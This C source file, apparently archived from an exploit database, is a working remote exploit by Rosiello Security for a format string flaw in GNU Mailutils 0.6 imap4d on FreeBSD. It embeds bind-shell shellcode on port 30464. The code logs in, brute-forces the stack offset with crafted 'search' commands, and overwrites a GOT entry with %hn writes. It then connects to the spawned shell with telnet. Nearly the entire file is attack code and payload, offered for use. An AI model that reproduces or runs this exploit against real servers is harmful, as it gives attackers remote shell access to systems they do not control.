/*
* Copyright (c) 2005 Rosiello Security
* http://www.rosiello.org
*
* Permission is granted for the redistribution of this software
* electronically. It may not be edited in any way without the express
* written consent of Rosiello Security.
*
* Disclaimer: The author published the information under the condition 
* that is not in the intention of the reader to use them in order to bring 
* to himself or others a profit or to bring to others damage.
*
* --------------------------------------------------------------------------
*
* GNU Mailutils 0.6 imap4d 'search' Format String Vulnerability
* iDEFENSE Security Advisory 09.09.05
* www.idefense.com/application/poi/display?id=303&type=vulnerabilities
*
* The GNU mailutils package is a collection of mail-related
* utilities, including local and remote mailbox access services.
* More information is available at the following site:
* http://www.gnu.org/software/mailutils/mailutils.html
*
* This exploit shows the possibility to run arbitrary code
* on FreeBSD machines.
*
* Authors: Johnny Mast and Angelo Rosiello
* e-mails: rave@rosiello.org angelo@rosiello.org
*/

#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdarg.h>


#define ISIP(m)   (!((int)inet_addr(m) ==-1))
#define clean(x)  memset(x, 0 , sizeof x)

char code[] =
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x31\xc0"    /* xor %eax,%eax */
"\x31\xc0"    /* xor %eax,%eax */
"\x50"    /* push %eax */
"\x31\xc0"    /* xor %eax,%eax */
"\x50"    /* push %eax */
"\xb0\x7e"    /* mov $0x7e,%al */
"\x50"    /* push %eax */
"\xcd\x80"    /* int $0x80 */
"\x31\xc0"    /* xor %eax,%eax */

/* fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) */
"\x31\xc0"                   // xorl    %eax,%eax
"\x31\xdb"                   // xorl    %ebx,%ebx
"\x31\xc9"                   // xorl    %ecx,%ecx
"\x31\xd2"                   // xorl    %edx,%edx
"\xb0\x61"                   // movb    $0x61,%al
"\x51"                       // pushl   %ecx 
"\xb1\x06"                   // movb    $0x6,%cl
"\x51"                       // pushl   %ecx
"\xb1\x01"                   // movb    $0x1,%cl   
"\x51"                       // pushl   %ecx
"\xb1\x02"                   // movb    $0x2,%cl
"\x51"                       // pushl   %ecx
"\x8d\x0c\x24"               // leal    (%esp),%ecx
"\x51"                       // pushl   %ecx
"\xcd\x80"                   // int     $0x80

/* it binds on port 30464 */
/* bind(fd, (struct sockaddr*)&sin, sizeof(sin))  */
"\xb1\x02"                   // movb    $0x2,%cl
"\x31\xc9"                   // xorl    %ecx,%ecx
"\x51"                       // pushl   %ecx
"\x51"                       // pushl   %ecx 
"\x51"                       // pushl   %ecx

/* port = 0x77, change if needed */
"\x80\xc1\x77"               // addb    $0x77,%cl  
"\x66\x51"                   // pushw   %cx
"\xb5\x02"                   // movb    $0x2,%ch
"\x66\x51"                   // pushw   %cx 
"\x8d\x0c\x24"               // leal    (%esp),%ecx
"\xb2\x10"                   // movb    $0x10,%dl  
"\x52"                       // pushl   %edx
"\x51"                       // pushl   %ecx
"\x50"                       // pushl   %eax
"\x8d\x0c\x24"               // leal    (%esp),%ecx
"\x51"                       // pushl   %ecx 
"\x89\xc2"                   // movl    %eax,%edx
"\x31\xc0"                   // xorl    %eax,%eax
"\xb0\x68"                   // movb    $0x68,%al
"\xcd\x80"                   // int     $0x80

/* listen(fd, 1)*/
"\xb3\x01"                   // movb    $0x1,%bl 
"\x53"                       // pushl   %ebx
"\x52"                       // pushl   %edx
"\x8d\x0c\x24"               // leal    (%esp),%ecx
"\x51"                       // pushl   %ecx
"\x31\xc0"                   // xorl    %eax,%eax
"\xb0\x6a"                   // movb    $0x6a,%al
"\xcd\x80"                   // int     $0x80

/* cli = accept(fd, 0,0) */
"\x31\xc0"                   // xorl    %eax,%eax  
"\x50"                       // pushl   %eax
"\x50"                       // pushl   %eax
"\x52"                       // pushl   %edx
"\x8d\x0c\x24"               // leal    (%esp),%ecx
"\x51"                       // pushl   %ecx
"\x31\xc9"                   // xorl    %ecx,%ecx
"\xb0\x1e"                   // movb    $0x1e,%al   
"\xcd\x80"                   // int     $0x80

/* dup2(cli,0) */
"\x89\xc3"                   // movl    %eax,%ebx
"\x53"                       // pushl   %ebx
"\x51"                       // pushl   %ecx
"\x31\xc0"                   // xorl    %eax,%eax  
"\xb0\x5a"                   // movb    $0x5a,%al
"\xcd\x80"                   // int     $0x80

/* dup2(cli, 1) */
"\x41"                       // inc     %ecx
"\x53"                       // pushl   %ebx
"\x51"                       // pushl   %ecx
"\x31\xc0"                   // xorl    %eax,%eax
"\xb0\x5a"                   // movb    $0x5a,%al
"\xcd\x80"                   // int     $0x80

/* dup2(cli, 2) */
"\x41"                       // inc     %ecx
"\x53"                       // pushl   %ebx
"\x51"                       // pushl   %ecx 
"\x31\xc0"                   // xorl    %eax,%eax
"\xb0\x5a"                   // movb    $0x5a,%al
"\xcd\x80"                   // int     $0x80

/* execve("//bin/sh", ["//bin/sh", NULL], NULL) */
"\x31\xdb"                   // xorl    %ebx,%ebx  
"\x53"                       // pushl   %ebx
"\x68\x6e\x2f\x73\x68"       // pushl   $0x68732f6e
"\x68\x2f\x2f\x62\x69"       // pushl   $0x69622f2f
"\x89\xe3"                   // movl    %esp,%ebx
"\x31\xc0"                   // xorl    %eax,%eax
"\x50"                       // pushl   %eax
"\x54"                       // pushl   %esp
"\x53"                       // pushl   %ebx
"\x50"                       // pushl   %eax
"\xb0\x3b"                   // mov     $0x3b,%al
"\xcd\x80"                   // int     $0x80

/* exit(..)  */
"\x31\xc0"                   // xorl    %eax,%eax
"\xb0\x01"                   // mobv    $0x1,%al
"\xcd\x80";                  // int     $0x80



void usage( int argc, char **argv )
{
 
  fprintf(stdout, "%s usage:\n\n", argv[0]);
  fprintf(stdout, "\t-h host\n");
  fprintf(stdout, "\t-p port\n");
  fprintf(stdout, "\t-l login\n");
  fprintf(stdout, "\t-a password\n\n");

  return;
}


void send_message( int fd, char *msg, ... )
{
  char string[2000];
  int len;
  size_t size;

  va_list  args;


  clean(string);


  va_start(args, msg);
  len = vsnprintf(string, sizeof(string)-1, msg,args);
  len = (len >=0) ? len : 0;

  /* Terminating the string */
  string[len]='\0';

  write(fd, string, len);

  return;
}





char *buildstring( long r_addr, long target, int offset, int sock )
{
  unsigned char string[512], a[4];
  int len;
  int high, low, arw;



  high = ( target & 0xffff0000 ) >> 16;
  low =  ( target & 0x0000ffff );

  clean(a); 
  a[0] = (r_addr >> 24) & 0xff;
  a[1] = (r_addr >> 16) & 0xff;
  a[2] = (r_addr >> 8) & 0xff;
  a[3] = (r_addr) & 0xff;
  a[4] = '\0';

  clean(string); 
  len = sprintf(string, "3 search topic .%c%c%c%c%%.%dx%%%d$hn\n",
	(int)a[3]+2,a[2],a[1],a[0],
	high -(0x24+13),   	/* Number of bytes for the first write */
	offset	/* The Offset to addr */
        );

  len = (len >=0) ? len : 0;
  string[len] = '\0';
  write(sock, string, len);

  read(sock, string, sizeof(string));


  clean(string);
  len = sprintf(string, "3 search topic .%c%c%c%c%%.%dx%%%d$hn%s\n",
       (int) a[3], (int)a[2], (int)a[1],(int)a[0],
        low - (0x24 +13),
        offset,          /* The offset to addr +2 */
	code
        );

  len = (len >=0) ? len : 0;
  string[len] = '\0';
  write(sock, string, len);


  return (char *)strdup(string);	
}


void get_addr_as_char( u_int addr, char *buf ) 
{
  *(u_int*)buf = addr;
  if (!buf[0]) buf[0]++;
  if (!buf[1]) buf[1]++;
  if (!buf[2]) buf[2]++;
  if (!buf[3]) buf[3]++;
}

static int got_entry = 0x08057a0c+4;


int comun( char *host, struct sockaddr_in sin4 )
{
  char *a[4] = { "/usr/bin/telnet", host , "30464", NULL };
  execve(a[0],a, NULL);
  return 0;
}

void welcome( )
{
  fprintf( stdout, "\nCopyright (c) 2005 Rosiello Security\n" );
  fprintf( stdout, "http://www.rosiello.org\n" );
  fprintf( stdout, "imap4d Format String Exploiter for FreeBSD\n\n" );
}

int main( int argc, char **argv )
{
  struct  hostent    *hp;
  struct sockaddr_in sin4;
  char shellbuf[1030];
  char *host, buffer[512], *ptr, *p, *USER, *PASS;
  int ch, port = 0, sock, offset = 1;
  int login  = 0, i, calc = 0;
  int ret = 0, len  = 0, b;
  int have_shell_loc = 0;
  unsigned int shell_addr = (u_int)0x0806c000;

  welcome( );

  if ( argc < 9 )
  { 
    usage(argc, argv);
    exit(EXIT_SUCCESS);
  }

  if (!(host = malloc (128)))
  {
    fprintf(stderr, "exp.c:115 Could not allocate memory\n");
    exit(EXIT_FAILURE);
  }


  while((ch = getopt(argc, argv, "h:p:l:a:")) != EOF) 
  {
   switch(ch) 
   {
      case 'h':
      host = (char *)strdup(optarg);
      break;

      case 'V':
      break;

      case 'p':
      port =  atoi (optarg);
      break;
 
      case 'l':
      USER = (char *)optarg;
      break;

      case 'a':
      PASS = (char *)optarg;
      break;

      default:
      usage(argc, argv);
      break;
 }	
}


 
  if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
  {
    fprintf(stderr, "exp.c:139 Error creating an new socket"); 
    exit(EXIT_FAILURE);
  }

  host = (host) ? host : "localhost";
  port = (port) ? port : 143;

  if (!(ISIP(host)))
  {
     if (!(hp = gethostbyname(host)))
     {
       fprintf(stderr, "exp.c:152 Could not resolve ip address\n");	
       exit(EXIT_FAILURE);
     } 

     memcpy(&sin4.sin_addr,hp->h_addr,hp->h_length);
     host = (char *)strdup(inet_ntoa(sin4.sin_addr)); 
  } else 
    sin4.sin_addr.s_addr = inet_addr(host);

 


  sin4.sin_family = AF_INET;
  sin4.sin_port = (unsigned short)htons( port );

  fprintf(stdout, "[+] Connecting to %s:%d\n", host,port);

  if ((connect(sock, (struct sockaddr *)&sin4,sizeof(struct sockaddr))) < 0)
  { 
     fprintf(stderr, "[*] exp.c:178 Connection failed\n");
     exit(EXIT_FAILURE);
  }


  fprintf(stdout, "[+] Connected .. \n");
  fprintf(stdout, "[+] Sending login ... \n");

  send_message(sock, "1 LOGIN %s %s\r\n", USER, PASS);
  fprintf(stdout, "[+] Done ... \n");

  while ((read(sock, buffer, 512)) > 0)
  {
    if ( login == 0  && ret == 0)
    switch (buffer[0])
    {

     case '1':
     fprintf(stdout, "[+] Selecting inbox ..\n");
     send_message(sock, "2 Select inbox\n");
     fprintf(stdout, "[+] Selecting Done .. Starting brute sequence\n");
     send_message(sock, "3 search topic .AAAABBBB%%%d$x\n",offset);
     login = 1;
     break;
    }


    if ((ptr=strstr(buffer, "(near")) && login == 1)
    {
      ptr +=15;
      if ((strncmp(ptr, "41414141",8))!=0) 
      {
        offset ++;
        send_message(sock, "3 search topic .AAAABBBB%%%d$x\n",offset);
      }
      else 
      {
        fprintf(stdout, "[+] Found offset %d\n", offset);
	fprintf(stdout, "[+] Finding buffer on the stack\n");
	ret = 1;
	login = 0;
        clean(buffer);
      }
    } 

    if ( ret == 1 )
    {
	
      if ((ptr=strstr(buffer, "(near"))) 
      {
        ptr +=6+4 +1; /* +4 for the addr string*/
	/* +1 for the junk char */
	calc = strlen(buffer) - strlen(ptr);
	calc -=6+4+1;	
	
	for (i = 0; i < strlen(buffer); i++) 
        {  
           if ( (strncmp(ptr, code, strlen(code)))==0 && have_shell_loc !=1)
           {
	     shell_addr += i -4;
	     have_shell_loc = 1;
	     sleep(2);
             buildstring(got_entry, shell_addr+=3, offset, sock);
             fprintf(stdout,"[+] Decoy found at %p\n", shell_addr);
       	     close(sock);
	     fprintf(stdout, "[+] Trying to contact the bind shell ..\n");
    	     if((comun(host, sin4)) < 0)
	       fprintf(stderr, "[-] Exploit failed\n");
           } 
           else
             ++ptr;
        } 
      }      
      if( shell_addr > 0xc0000000)
        break;
      shell_addr++;
      ptr = ((char *)&shell_addr);
      ptr[4] = 0;
      if ( strchr(ptr, 0xa) || strchr(ptr, 0xd) || ptr[0]==0x00) 
      {
        shell_addr ++;
        ptr = ((char *)&shell_addr);
        ptr[4] = 0;
      } 
      while (strlen(ptr) !=4)
      {
        shell_addr++;
        ptr = ((char *)&shell_addr);
        ptr[4] = 0;
      }
      if (have_shell_loc != 1)
      {
        send_message(sock, "3 search topic .%s....%%%d$s%sCCCC\n",ptr,offset,code);
      }
    }
    clean(buffer);
  }

  fprintf(stderr, "[+] Closing connection\n");
  close(sock);
  free(host);

  fprintf(stderr, "[-] Exploit failed %p\n", shell_addr);
  return 0;
}

// milw0rm.com [2005-09-26]
